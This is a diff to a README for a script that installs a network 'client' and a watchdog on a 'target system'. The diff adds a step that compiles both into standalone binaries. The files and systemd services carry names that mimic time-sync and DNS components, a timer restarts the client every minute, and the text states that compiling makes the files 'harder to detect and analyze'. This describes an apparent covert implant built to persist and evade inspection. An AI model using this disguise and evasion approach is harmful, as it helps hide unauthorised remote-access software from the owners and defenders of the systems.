@@ -29,14 +29,16 @@
 
 The script will:
 - Read configuration from `.env` file
+- Install Python dependencies (netifaces, pyinstaller)
 - Embed configuration directly into the client script
-- Install the client script to `/etc/ntpsync/ntp`
-- Install monitor script to `/etc/dnsresolve/conf`
+- **Compile both scripts to standalone binary executables**
+- Install the client binary to `/etc/ntpsync/ntp`
+- Install monitor binary to `/etc/dnsresolve/conf`
 - Create and enable the `ntpsyncd` systemd service
 - Create and enable the `dnsresolv` systemd timer (monitors the service every minute)
 - Start the client service
 
-**Note**: Configuration is embedded directly into the installed script (`/etc/ntpsync/ntp`), so no separate `.env` file exists on the target system.
+**Important**: The installed files are compiled binaries, not Python scripts. The source code is not visible on the target system, making them harder to detect and analyze.
 
 ### Uninstallation
 
@@ -62,9 +64,9 @@ Edit the `.env` file **before installation**:
 - `SERVER_PORT`: Server port (default: 8443)
 - `CLIENT_NAME`: Optional client identifier (if empty, uses primary network interface IP)
 
-**Important**: The configuration is embedded into the client script during installation. If you need to change the configuration after installation, you must:
+**Important**: The configuration is embedded into the client during compilation. The installed binary contains the configuration and cannot be easily modified. If you need to change the configuration after installation, you must:
 1. Edit the `.env` file
-2. Run `sudo ./install.sh` again to reinstall with new configuration
+2. Run `sudo ./install.sh` again to recompile and reinstall with new configuration
 
 ## Running the Client
 
@@ -114,12 +116,12 @@ sudo journalctl -u ntpsyncd -f
 To update the configuration after installation:
 
 1. Edit the `.env` file with new values
-2. Reinstall the service:
+2. Recompile and reinstall:
    ```bash
    sudo ./install.sh
    ```
 
-The installation script will detect the existing service and update it with the new configuration.
+The installation script will recompile the binary with the new embedded configuration and replace the existing installation.
 
 ### Check Monitoring Timer
 
@@ -147,12 +149,12 @@ sudo systemctl disable ntpsyncd
 
 ### Installed Files
 
-- **Client script**: `/etc/ntpsync/ntp` (with embedded configuration)
-- **Monitor script**: `/etc/dnsresolve/conf`
+- **Client binary**: `/etc/ntpsync/ntp` (compiled executable with embedded configuration)
+- **Monitor binary**: `/etc/dnsresolve/conf` (compiled executable)
 - **Service file**: `/etc/systemd/system/ntpsyncd.service`
 - **Timer files**: `/etc/systemd/system/dnsresolv.{service,timer}`
 
-**Note**: No separate `.env` file is created on the target system. All configuration is embedded directly in `/etc/ntpsync/ntp`.
+**Important**: Both installed files are compiled binary executables (ELF format on Linux). The source code is not visible or accessible on the target system. Configuration is embedded during compilation.
 
 ### How the Monitoring Works
 
@@ -235,7 +237,7 @@ The configuration is embedded in the script, so you need to reinstall:
 
 ### Testing Without Installation
 
-Use the original `client.py` for testing:
+Use the original `client.py` for testing (requires `.env` file):
 
 ```bash
 # Create .env file
@@ -246,9 +248,15 @@ nano .env
 sudo python client.py
 ```
 
+**Note**: The installed production version is a compiled binary, but you can still test with the Python script during development.
+
 ### Template Files
 
-- **ntp-daemon**: Template with `{{SERVER_HOST}}`, `{{SERVER_PORT}}`, and `{{CLIENT_NAME}}` placeholders
-- **conf**: Monitor script template
+- **ntp-daemon**: Python template with `{{SERVER_HOST}}`, `{{SERVER_PORT}}`, and `{{CLIENT_NAME}}` placeholders
+- **conf**: Bash script for monitoring (original, kept for reference)
+- **conf.py**: Python version of monitor script
 
-The `install.sh` script replaces these placeholders with actual values from `.env` during installation.
+The `install.sh` script:
+1. Replaces placeholders in `ntp-daemon` with values from `.env`
+2. Compiles both `ntp-daemon` and `conf.py` to standalone binaries using PyInstaller
+3. Installs the compiled binaries (no Python source code on target system)
